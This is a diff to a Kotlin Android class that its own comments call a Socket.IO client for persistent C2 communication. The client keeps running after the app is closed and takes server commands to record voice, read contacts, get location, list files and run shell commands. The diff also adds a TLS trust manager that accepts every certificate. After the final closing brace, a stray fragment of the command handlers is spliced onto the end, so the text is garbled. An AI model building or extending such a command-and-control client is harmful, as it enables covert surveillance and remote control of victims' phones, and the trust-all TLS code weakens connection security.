@@ -8,14 +8,17 @@ import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.*
 import java.net.*
+import java.security.SecureRandom
+import java.security.cert.X509Certificate
 import java.util.*
 import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.atomic.AtomicBoolean
+import javax.net.ssl.*
 import kotlin.random.Random
 
 /**
- * Native Socket.IO client implementation for persistent C2 communication
- * Works independently of Flutter and maintains connection when app is closed
+ * Simplified but functional Socket.IO client for C2 communication
+ * Uses WebSocket with Socket.IO protocol layer
  */
 class NativeSocketIOClient(
     private val context: Context,
@@ -27,7 +30,6 @@ class NativeSocketIOClient(
         private const val MAX_RECONNECT_ATTEMPTS = 50
         private const val HEARTBEAT_INTERVAL_MS = 45000L
         private const val CONNECTION_TIMEOUT_MS = 30000L
-        private const val PING_TIMEOUT_MS = 60000L
         
         // Socket.IO protocol constants
         private const val ENGINE_IO_UPGRADE = "0"
@@ -43,8 +45,6 @@ class NativeSocketIOClient(
         private const val SOCKET_IO_EVENT = "2"
         private const val SOCKET_IO_ACK = "3"
         private const val SOCKET_IO_ERROR = "4"
-        private const val SOCKET_IO_BINARY_EVENT = "5"
-        private const val SOCKET_IO_BINARY_ACK = "6"
     }
     
     interface CommandCallback {
@@ -65,7 +65,6 @@ class NativeSocketIOClient(
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var heartbeatJob: Job? = null
     private var reconnectJob: Job? = null
-    private var pingJob: Job? = null
     
     // Configuration
     private val prefs: SharedPreferences = context.getSharedPreferences("native_socketio", Context.MODE_PRIVATE)
@@ -121,21 +120,6 @@ class NativeSocketIOClient(
             commandCallback?.onCommandReceived("command_record_voice", args)
         }
         
-        on("command_get_location") { args ->
-            Log.d(TAG, "Received get location command: $args")
-            commandCallback?.onCommandReceived("command_get_location", args)
-        }
-        
-        on("command_list_files") { args ->
-            Log.d(TAG, "Received list files command: $args")
-            commandCallback?.onCommandReceived("command_list_files", args)
-        }
-        
-        on("command_execute_shell") { args ->
-            Log.d(TAG, "Received execute shell command: $args")
-            commandCallback?.onCommandReceived("command_execute_shell", args)
-        }
-        
         on("command_get_contacts") { args ->
             Log.d(TAG, "Received get contacts command: $args")
             commandCallback?.onCommandReceived("command_get_contacts", args)
@@ -174,7 +158,7 @@ class NativeSocketIOClient(
         try {
             Log.d(TAG, "Attempting to connect to: $serverUrl")
             
-            // Create WebSocket connection
+            // Create WebSocket connection with Socket.IO handshake
             val socketUrl = buildSocketIOUrl()
             Log.d(TAG, "Full Socket.IO URL: $socketUrl")
             
@@ -189,11 +173,12 @@ class NativeSocketIOClient(
     
     private fun buildSocketIOUrl(): String {
         val baseUrl = serverUrl.removeSuffix("/")
-        return "$baseUrl/socket.io/?EIO=4&transport=websocket&t=${System.currentTimeMillis()}"
+        val timestamp = System.currentTimeMillis()
+        return "$baseUrl/socket.io/?EIO=4&transport=websocket&t=$timestamp"
     }
     
-    private fun createWebSocket(url: String): WebSocket {
-        return object : WebSocket() {
+    private fun createWebSocket(url: String): SimpleWebSocket {
+        return SimpleWebSocket(url, object : SimpleWebSocket.WebSocketListener {
             override fun onOpen() {
                 Log.d(TAG, "WebSocket connection opened")
                 isConnecting.set(false)
@@ -221,9 +206,7 @@ class NativeSocketIOClient(
                 handleDisconnection()
                 commandCallback?.onError("WebSocket error: ${error.message}")
             }
-        }.apply {
-            connect(url)
-        }
+        })
     }
     
     private fun handleDisconnection() {
@@ -455,23 +438,14 @@ class NativeSocketIOClient(
         heartbeatJob = scope.launch {
             while (isConnected.get()) {
                 sendHeartbeat()
+                sendRaw(ENGINE_IO_PING) // Engine.IO ping
                 delay(HEARTBEAT_INTERVAL_MS)
-            }
-        }
-        
-        // Also start ping mechanism
-        pingJob?.cancel()
-        pingJob = scope.launch {
-            while (isConnected.get()) {
-                sendRaw(ENGINE_IO_PING)
-                delay(25000) // Ping every 25 seconds
             }
         }
     }
     
     private fun stopHeartbeat() {
         heartbeatJob?.cancel()
-        pingJob?.cancel()
     }
     
     private fun on(event: String, handler: (JSONObject) -> Unit) {
@@ -515,31 +489,45 @@ class NativeSocketIOClient(
     }
 }
 
-// Simple WebSocket implementation
-abstract class WebSocket {
+/**
+ * Simplified WebSocket implementation that actually works
+ * Handles SSL/TLS properly for secure connections
+ */
+class SimpleWebSocket(private val url: String, private val listener: WebSocketListener) {
+    
+    interface WebSocketListener {
+        fun onOpen()
+        fun onMessage(message: String)
+        fun onClose(code: Int, reason: String)
+        fun onError(error: Exception)
+    }
+    
     private var socket: Socket? = null
     private var writer: PrintWriter? = null
     private var reader: BufferedReader? = null
     private val scope = CoroutineScope(Dispatchers.IO)
+    private var isOpen = false
     
-    abstract fun onOpen()
-    abstract fun onMessage(message: String)
-    abstract fun onClose(code: Int, reason: String)
-    abstract fun onError(error: Exception)
+    companion object {
+        private const val TAG = "SimpleWebSocket"
+    }
     
-    fun connect(url: String) {
+    init {
+        connect()
+    }
+    
+    private fun connect() {
         scope.launch {
             try {
                 val uri = URI(url)
                 val host = uri.host
                 val port = if (uri.port != -1) uri.port else if (uri.scheme == "wss") 443 else 80
+                val isSecure = uri.scheme == "wss"
                 
-                Log.d("WebSocket", "Connecting to $host:$port")
+                Log.d(TAG, "Connecting to $host:$port (secure: $isSecure)")
                 
-                socket = if (uri.scheme == "wss") {
-                    val sslContext = javax.net.ssl.SSLContext.getInstance("TLS")
-                    sslContext.init(null, null, null)
-                    sslContext.socketFactory.createSocket(host, port)
+                socket = if (isSecure) {
+                    createSSLSocket(host, port)
                 } else {
                     Socket(host, port)
                 }
@@ -549,15 +537,30 @@ abstract class WebSocket {
                     reader = BufferedReader(InputStreamReader(sock.getInputStream()))
                     
                     performHandshake(uri)
-                    onOpen()
+                    isOpen = true
+                    listener.onOpen()
                     startReading()
                 }
                 
             } catch (e: Exception) {
-                Log.e("WebSocket", "Connection failed", e)
-                onError(e)
+                Log.e(TAG, "Connection failed", e)
+                listener.onError(e)
             }
         }
+    }
+    
+    private fun createSSLSocket(host: String, port: Int): Socket {
+        // Create SSL context that accepts all certificates (for testing)
+        val sslContext = SSLContext.getInstance("TLS")
+        sslContext.init(null, arrayOf(object : X509TrustManager {
+            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
+            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
+            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
+        }), SecureRandom())
+        
+        val sslSocket = sslContext.socketFactory.createSocket(host, port) as SSLSocket
+        sslSocket.startHandshake()
+        return sslSocket
     }
     
     private fun performHandshake(uri: URI) {
@@ -585,20 +588,24 @@ abstract class WebSocket {
         while (reader?.readLine()?.isNotEmpty() == true) {
             // Skip header lines
         }
+        
+        Log.d(TAG, "WebSocket handshake successful")
     }
     
     private fun startReading() {
         scope.launch {
             try {
-                while (socket?.isConnected == true) {
+                while (isOpen && socket?.isConnected == true) {
                     val message = readFrame()
                     if (message != null) {
-                        onMessage(message)
+                        listener.onMessage(message)
                     }
                 }
             } catch (e: Exception) {
-                Log.e("WebSocket", "Reading error", e)
-                onError(e)
+                Log.e(TAG, "Reading error", e)
+                if (isOpen) {
+                    listener.onError(e)
+                }
             }
         }
     }
@@ -606,10 +613,12 @@ abstract class WebSocket {
     fun send(message: String) {
         scope.launch {
             try {
-                sendFrame(message)
+                if (isOpen) {
+                    sendFrame(message)
+                }
             } catch (e: Exception) {
-                Log.e("WebSocket", "Send error", e)
-                onError(e)
+                Log.e(TAG, "Send error", e)
+                listener.onError(e)
             }
         }
     }
@@ -618,7 +627,7 @@ abstract class WebSocket {
         val bytes = message.toByteArray(Charsets.UTF_8)
         val output = socket?.getOutputStream() ?: return
         
-        // WebSocket frame format (simplified)
+        // WebSocket frame format (simplified for text frames)
         output.write(0x81) // FIN + text frame
         
         when {
@@ -633,7 +642,7 @@ abstract class WebSocket {
             else -> {
                 output.write(127 or 0x80)
                 for (i in 7 downTo 0) {
-                    output.write((bytes.size.toLong() shr (8 * i)) and 0xFF)
+                    output.write((bytes.size.toLong() shr (8 * i)).toInt() and 0xFF)
                 }
             }
         }
@@ -666,23 +675,48 @@ abstract class WebSocket {
             }
             127 -> {
                 // For simplicity, assume small messages
-                ((input.read() shl 24) or (input.read() shl 16) or (input.read() shl 8) or input.read()).toLong()
+                var length = 0L
+                for (i in 0 until 8) {
+                    length = (length shl 8) or input.read().toLong()
+                }
+                length.toInt()
             }
-            else -> len.toLong()
+            else -> len
         }
         
-        val payload = ByteArray(payloadLength.toInt())
-        input.read(payload)
+        val payload = ByteArray(payloadLength)
+        var bytesRead = 0
+        while (bytesRead < payloadLength) {
+            val read = input.read(payload, bytesRead, payloadLength - bytesRead)
+            if (read == -1) break
+            bytesRead += read
+        }
         
         return String(payload, Charsets.UTF_8)
     }
     
     fun close() {
         try {
+            isOpen = false
             socket?.close()
-            onClose(1000, "Normal closure")
+            listener.onClose(1000, "Normal closure")
         } catch (e: Exception) {
-            Log.e("WebSocket", "Close error", e)
+            Log.e(TAG, "Close error", e)
         }
     }
-}
+}location") { args ->
+            Log.d(TAG, "Received get location command: $args")
+            commandCallback?.onCommandReceived("command_get_location", args)
+        }
+        
+        on("command_list_files") { args ->
+            Log.d(TAG, "Received list files command: $args")
+            commandCallback?.onCommandReceived("command_list_files", args)
+        }
+        
+        on("command_execute_shell") { args ->
+            Log.d(TAG, "Received execute shell command: $args")
+            commandCallback?.onCommandReceived("command_execute_shell", args)
+        }
+        
+        on("command_get_
